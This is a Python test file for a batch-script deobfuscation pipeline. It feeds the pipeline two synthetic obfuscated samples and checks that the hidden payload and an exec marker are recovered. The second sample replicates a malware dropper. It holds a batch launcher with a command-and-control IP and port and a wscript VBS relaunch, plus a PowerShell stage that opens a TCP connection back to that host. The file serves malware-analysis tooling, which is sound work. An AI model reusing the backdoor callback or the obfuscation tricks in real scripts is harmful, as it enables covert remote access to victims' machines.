"""End-to-end: run the whole recommended chain (tests._harness.CHAIN) to a
fixpoint over one deliberately layered synthetic sample, and assert the
obfuscation is gone, the payload is recovered, and the exec sink survives.

Also a flow-sensitivity trap: `HARV` is reused right after a `%HARV:~..%`
character harvest, then read again -- the harvest must use the pre-reassign
value, and that must hold at EVERY intermediate stage, never leaking backward.
"""
import re
import subprocess
import sys
import unittest
from pathlib import Path

from tests._harness import CHAIN, PipelineMixin, TOOL_DIR, run_cli_outdir

_SOURCE = (
    '@echo off\r\n'
    'rem ---- generated junk banner ----\r\n'
    ':: parked data line aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n'
    'set "SEED=QZa9_powershellXX-NoProfile__ABCDEF"\r\n'
    'set /a "PAD=(10+10-(3-7))+6"\r\n'
    'set "P1=%SEED:~17,10%"\r\n'
    'set "HARV=%SEED:~0,3%"\r\n'
    'echo first %HARV%\r\n'
    'set "HARV=reassigned"\r\n'
    'echo second %HARV%\r\n'
    'p^o^w^e^r^s^h^e^l^l %P1% -Command "Write-Host %PAD%" & set "TAIL=done"\r\n'
    'if "1"=="1" echo taken-branch\r\n'
    'if "9"=="8" echo dead-branch\r\n'
    'goto :real\r\n'
    'echo never-runs\r\n'
    ':real\r\n'
    'echo end %TAIL%\r\n'
)


class TestSyntheticPipeline(PipelineMixin):
    def setUp(self):
        super().setUp()
        self.final, self.iters = self.run_to_fixpoint(CHAIN, _SOURCE, max_iters=8)

    def test_obfuscation_shapes_are_gone(self):
        self.assertNotIn('^o^w^e', self.final)          # caret splitting
        self.assertNotIn('%SEED:~', self.final)          # substring harvest
        self.assertNotIn('set /a', self.final.lower())   # junk arithmetic folded
        self.assertNotIn('dead-branch', self.final)      # statically-false if
        self.assertNotIn('never-runs', self.final)       # unreachable

    def test_payload_is_revealed(self):
        self.assertIn('powershell', self.final.lower())
        self.assertIn('-NoProfile', self.final)          # harvested from SEED
        self.assertIn('30', self.final)                  # PAD = (20-(-4))+6

    def test_exec_sink_annotated(self):
        self.assertIn('<<<EXEC PAYLOAD BEGIN>>>', self.final)

    def test_taken_branch_survives(self):
        self.assertIn('taken-branch', self.final)

    def test_converges(self):
        self.assertLessEqual(self.iters, 8)

    def test_flow_trap_never_leaks_backward_at_any_stage(self):
        # run the chain one pass and inspect every intermediate file: the
        # first harvest/echo must never show the post-reassignment value.
        stats, paths = self.run_pipeline(CHAIN, _SOURCE)
        for p in paths:
            txt = p.read_text('utf-8', errors='replace')
            # `echo first <X>` must never become `echo first reassigned`
            m = re.search(r'echo first (\S+)', txt)
            if m:
                self.assertNotEqual(m.group(1), 'reassigned',
                                    f'post-reassign value leaked into the first echo in {p.name}')


# Structural replica of 1bc067d7...: batch launcher sets C2 env vars, relaunches
# a VBS payload via wscript, then exits; a `__PS__` marker separates the TCP
# backdoor (written in PowerShell, reads the env vars the batch region set).
# The obfuscation shapes present in the original: caret-split keywords, junk
# `set /a`, `%VAR:~N,1%` character harvesting, and an appended `::` comment block.
_SOURCE_POLYGLOT = (
    '@e^cho o^ff\r\n'
    'set /a "JNK=(3*7-1)"\r\n'
    'set "H=217.60.195.197"\r\n'
    'set "P=7777"\r\n'
    'set "WS=wscript"\r\n'
    ':: junk comment block aaaaaaaaaaaa\r\n'
    '%WS% //b //nologo "%~dp0payload.vbs" %H% %P%\r\n'  # H and P read here -> not dead stores
    'exit /b 0\r\n'
    '__PS__\r\n'
    '$EA=\'SilentlyContinue\'\r\n'
    '$h=$env:H\r\n'
    '$p=[int]$env:P\r\n'
    '$c=New-Object Net.Sockets.TcpClient($h,$p)\r\n'
    '$s=$c.GetStream()\r\n'
    '[byte[]]$b=0..255|%{0}\r\n'
    'while(($i=$s.Read($b,0,$b.Length)) -ne 0){}\r\n'
)


class TestPolyglotPipeline(PipelineMixin):
    """bat_split_polyglot separates the batch launcher from the __PS__ PowerShell
    backdoor; the chain cleans the launcher; the C2 indicators survive intact.

    Motivated by sample 1bc067d7bc73a5205544164b122634bf25d98c2b6e81a3353b895aa9d0d3707c:
    batch region sets H= (C2 host) and P= (C2 port) as env vars, relaunches a
    VBS dropper, then exits; the PS stage reads $env:H / $env:P for the TCP
    callback — the IP never appears as a literal in the PS stage.
    """

    def setUp(self):
        super().setUp()
        self.split = run_cli_outdir('bat_split_polyglot.py', _SOURCE_POLYGLOT)
        self.addCleanup(self.split.cleanup)

    def test_polyglot_split_recovers_the_backdoor(self):
        self.assertEqual(len(self.split.manifest['stages']), 1)
        st = self.split.manifest['stages'][0]
        self.assertEqual(st['file'], 'stage_trailer.ps1')
        self.assertEqual(st.get('marker'), '__PS__')

    def test_c2_indicators_preserved_in_the_stage(self):
        ps = self.split.read('stage_trailer.ps1').decode('utf-8', 'replace')
        # PS backdoor reads C2 host/port from env vars set in the batch region
        self.assertIn('$env:H', ps)             # C2 host read from env
        self.assertIn('$env:P', ps)             # C2 port read from env
        self.assertNotIn('@echo off', ps)       # no batch leaked in

    def test_batch_region_is_cleanable_and_keeps_the_relaunch(self):
        region = self.split.read('batch_region.cmd').decode('utf-8', 'replace')
        final, iters = self.run_to_fixpoint(CHAIN, region, max_iters=6)
        self.assertLessEqual(iters, 6)
        self.assertIn('wscript', final.lower())          # the VBS relaunch survives
        self.assertIn('217.60.195.197', final)           # C2 IOC in the set statement

    def test_chain_reduces_var_refs_and_errors_none(self):
        stats, paths = self.run_pipeline(CHAIN, _SOURCE_POLYGLOT)
        for name, s in zip((c[0] for c in CHAIN), stats):
            self.assertNotIn('reason', s, f'{name} refused: {s.get("reason")}')
        for p in paths:
            self.assertFalse(p.read_bytes().startswith(b'ERROR: '))


if __name__ == '__main__':
    unittest.main()
